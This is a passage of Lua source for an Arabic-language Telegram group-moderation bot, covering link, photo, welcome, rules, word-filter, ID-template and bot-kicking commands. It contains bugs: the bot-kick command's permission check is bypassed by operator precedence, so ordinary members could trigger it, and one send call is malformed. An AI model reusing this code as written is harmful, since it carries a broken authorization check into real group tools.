tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


-----------------------------------------------------
if text == "تعطيل الصوره" or text == 'تعطيل صورتي' then
if Mod(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر صورتي ↝ ܰ") 
return false end
end
if text == "الرابط" then
local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"܁༯┆الرابط معطل † ارسل تفعيل الرابط↝ ܰ ") 
return false  
end   
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then                              
send(msg.chat_id_,msg.id_,'𖦲┆*𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿*  ↝ 𖥣 ٠\n••━━━━━━𖥠━━━━━━••\n['..link..']')                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
linkgp = '༯┆*𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿* ↝🦄 ٠\n•━━━━━━𖥠━━━━━━•\n ['..linkgpp.result..']'
else
linkgp = '܁༯┆لايوجد رابط ܊ ارسل ضع رابط ↝ ܰ '
end  
send(msg.chat_id_, msg.id_,linkgp)              
end          
end
if text == 'مسح الرابط' or text == 'حذف الرابط' then
if Mod(msg) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_,msg.id_,"܁༯┆تم حذف الرابط بنجاح ↝ ܰ ")           
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ضع صوره") and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ قم بارسل الصوره ↝ ܰ') 
return false
end
if text == "حذف الصوره" or text == "مسح الصوره" then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'܁༯┆تم ازالةه صوره المجموعةه↝ ܰ ') 
end
return false  
end
if text == 'ضع وصف' or text == 'وضع وصف' then  
if Mod(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ قم بارسل الوصف ↝ ܰ')
end
return false  
end
if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
if Mod(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ارسل الترحيب الان 𖢟 .'
tt = '\n܁༯┆تستطيع اضافة ماياتي 𖢟 .\n܁༯┆دالة عرض الاسم ◃ `name`\n܁༯┆دالة عرض المعرف ◃ `user`'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' and Mod(msg) then 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
GetWelcome = GetWelcomeGroup
else 
GetWelcome = '܁༯┆لا يوجد ترحيب ↝ ܰ\n܁༯┆ ارسل ضع ترحيب لوضع ترحيب ↝ ܰ '
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ?? •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الترحيب ↝ ܰ') 
return false  
end
if text == 'تعطيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الترحيب ↝ ܰ') 
return false  
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف الترحيب ↝ ܰ ') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمة الذي تريد منعها ↝ ܰ")  
database:set(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة ↝ ܰ")  
database:set(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."MILAN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."MILAN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير ↝ ܰ")  
database:del(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."MILAN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."MILAN1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."MILAN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان ↝ ܰ ")  
database:set(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء منع الكلمةه ↝ ܰ  ")  
database:del(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MILAN1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."MILAN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = '܁༯┆تم المنع لن يتم ارسالها مجددا ↝ ܰ  '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = '܁༯┆تم الغاء المنع ↝ ܰ  '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end

if text == "مسح قائمه المنع"and Manager(msg) then   
local list = database:smembers(bot_id.."MILAN1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."MILAN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MILAN1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."MILAN1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"܁༯┆تم مسح قائمة المنع↝ ܰ ")  
end

if text == "قائمه المنع" and Manager(msg) then   
local list = database:smembers(bot_id.."MILAN1:List:Filter"..msg.chat_id_)  
t = "\n٭ 𖤓┆قائمة المنع ☓↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local MILAN_Msg = database:get(bot_id.."MILAN1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..MILAN_Msg.."◜\n"    
end  
if #list == 0 then  
t = "܁༯┆لايوجد كلمات ممنوعةه ↝ ܰ "  
end  
send(msg.chat_id_, msg.id_,t)  
end  

if text == 'مسح قائمه منع المتحركات' and Manager(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ تم مسح قائمه منع المتحركات ↝ ܰ ')  
end
if text == 'مسح قائمه منع الصور' and Manager(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ تم مسح قائمه منع الصور ↝ ܰ ')  
end
if text == 'مسح قائمه منع الملصقات' and Manager(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ تم مسح قائمه منع الملصقات ↝ ܰ ')  
end
if text == 'المطور' or text == 'مطور' or text == 'المطوره' then
local Text_Dev = database:get(bot_id..'Text:Dev:Bot')
if Text_Dev then 
send(msg.chat_id_, msg.id_,Text_Dev)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
end,nil)
end
end

if text == 'حذف كليشه المطور' and SudoBot(msg) then
database:del(bot_id..'Text:Dev:Bot')
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف كليشه المطور ↝ ܰ')
end
if text == 'ضع كليشه المطور' and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:set(bot_id..'Set:Text:Dev:Bot'..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,'܁༯┆ارسل الكليشةه الان ↝ ܰ ')
return false
end
if text and database:get(bot_id..'Set:Text:Dev:Bot'..msg.chat_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:Text:Dev:Bot'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆تم الغاء حفظ كليشةه المطور ↝ ܰ ')
return false
end
database:set(bot_id..'Text:Dev:Bot',text)
database:del(bot_id..'Set:Text:Dev:Bot'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆تم حفظ كليشةه المطور ↝ ܰ ')
return false
end
if text == 'تعين الايدي' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
܁༯┆هلو عمري ↝ ܰ
܁༯┆يمكنك اضافة ܊
▹ `#rdphoto` 𖤱 ܁ تعليق الصوره
▹ `#username` 𖤱 ܁ اسم المستخدم
▹ `#msgs` 𖤱 ܁ عدد رسائل المستخدم
▹ `#photos` 𖤱 ܁ عدد صور المستخدم
▹ `#id` 𖤱 ܁ ايدي المستخدم
▹ `#auto` 𖤱 ܁ تفاعل المستخدم
▹ `#stast` 𖤱 ܁ موقع المستخدم
▹ `#edit` 𖤱 ܁ عدد السحكات 
▹ `#game` 𖤱 ܁ المجوهرات
•━━━━━━𖥠━━━━━━•
܁༯┆ارسل تغير الايدي ليتم تغير الايدي ↝ ܰ 
]]
send(msg.chat_id_, msg.id_,Text)
return false  
elseif text == 'تغير الايدي' and Mod(msg) then 
local List = {
[[
[[
⌔︙Msgs : #msgs
⌔︙ID : #id
⌔︙Stast : #stast
⌔︙UserName : #username
]],
[[
ᯓ 𝟔𝟔𝟔𖡋 #username 
ᯓ 𝟔𝟔𝟔𖡋 #stast  
ᯓ 𝟔𝟔𝟔𖡋 #id  
ᯓ 𝟔𝟔𝟔𖡋 #msgs  
ᯓ 𝟔𝟔𝟔𖡋 #game
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.?? 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]]}
local Text_Rand = List[math.random(#List)]
database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,'܁༯┆تم تغير الايدي ܊ قم بالتجربه ܊ ↝ ܰ')
end
if text == 'حذف الايدي' or text == 'مسح الايدي' then
if Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:del(bot_id.."KLISH:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '܁༯┆ تم ازالة كليشة الايدي ↝ ܰ')
end
return false  
end 

if database:get(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء تعين الايدي ↝ ܰ ") 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,'܁༯┆تم تعين الايدي بنجاح ↝ ܰ ')    
end

if text == 'مسح البوتات' or text == 'طرد البوتات' and Mod(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "܁༯┆لا توجد بوتات في المجموعه ↝ ܰ")
else
local t = '܁༯┆تم مسح البوتات ↝ ܰ'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
end
if text == ("كشف البوتات") and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة ?? •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n܁༯┆قائمة البوتات الموجودة  ▿ ↝ ܰ\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = '܊'
end
text = text.."𖠵 ◜ [@"..ta.username_..']◞. '..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "܁༯┆لاتوجد بوتات مضافةه  ↝ ܰ")
return false 
end
if #admins == i then 
local a = '\n•━━━━━━━━━━━━•\n܁༯┆عدد البوتات في المجموعةه  ˼ '..n..' ˹\n'
local f = '܁༯┆عدد البوتات المرفوعه   ˼ '..t..' ˹\n܁༯┆◝*܊*◟ تعني ان البوت ادمن في المجموعة'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, "܁༯┆تم الغاء حفظ القوانين ↝ ܰ ") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"܁༯┆تم حفض القوانين ܊ قم بالتجربه ܊ ↝ ܰ") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' or text == 'وضع قوانين' then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ قم بارسل القوانين الان ↝ ܰ")  
end
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_,"܁༯┆تم حذف القوانين ↝ ܰ ")  
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"܁༯┆لايوجد قوانين ↝ ܰ ")   
end    
end
if text == 'قفل التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆هلو عمري  ↝ ܰ\n܁༯┆تم قفل التفليش ↝ ܰ')  
end,nil)   
end
if text == 'فتح التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆هلو عمري  ↝ ܰ\n܁༯┆تم فتح التفليش ↝ ܰ ')  
end,nil)   
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'܁༯┆تم طرد المحذوفين ↝ ܰ')
end,nil)
end
end
if text == 'الصلاحيات' and Mod(msg) then 
local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,'⚠️┇ لا توجد صلاحيات مضافه')
return false
end
t = "\n☑️┇ قائمة الصلاحيات المضافه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..''..k..'- '..v..' » ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "܁༯┆ارسل الي رتبت الصلاحيةه ↝ ܰ\n܁༯┆{عـضـو -- ممـيـز -- ادمـن -- مـديـر} ↝ ܰ") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "܁༯┆تم مسح الصلاحيةه ↝ ܰ") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء الامر ↝ ܰ") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"*☑️┇ تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n☑️┇ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"*☑️┇ تستطيع اضافه صلاحيات {مميز - عضو} \n☑️┇ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"*☑️┇ تستطيع اضافه صلاحيات {عضو} \n☑️┇ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "⚠️┇ تـم اضـافـه الامـر √") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('رفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('رفع (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة ?? •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
